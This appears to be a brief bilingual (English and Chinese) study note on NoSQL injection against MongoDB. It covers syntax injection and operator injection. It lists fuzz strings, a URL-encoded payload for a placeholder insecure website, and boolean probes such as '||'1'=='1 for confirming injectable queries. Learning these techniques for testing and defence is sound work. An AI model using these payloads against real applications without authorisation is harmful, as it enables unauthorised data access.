## NoSQL injection
- MongoDB
-  JSON 查詢
  
- **Syntax injection**
    - 注入您自己的有效載荷
    - 提交模糊字串和特殊字符
 
- **Operator injection**
    - 使用 NoSQL 查詢運算子

**Example :**
- https://insecure-website.com/product/lookup?category=fizzy
- this.category == 'fizzy'
- this.category == '\"`{\r;$Foo}\n$Foo \\xYZ\u0000
- https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00

## 查詢哪些字元會被應用程式解釋為語法
- 注入單一字元 [`] : this.category == '''
  - 如果這導致原始回應發生變化，則可能表示該'字元破壞了查詢語法並導致了語法錯誤
  - Retest : this.category == '\''
 
## 確認條件行為
- 假 : ' && 0 && 'x (lookup?category=fizzy'+%26%26+0+%26%26+'x)
- 真 : ' && 1 && 'x (lookup?category=fizzy'+%26%26+1+%26%26+'x)
- 真 JavaScript 條件，例如 '||'1'=='1 (this.category == 'fizzy'||'1'=='1')
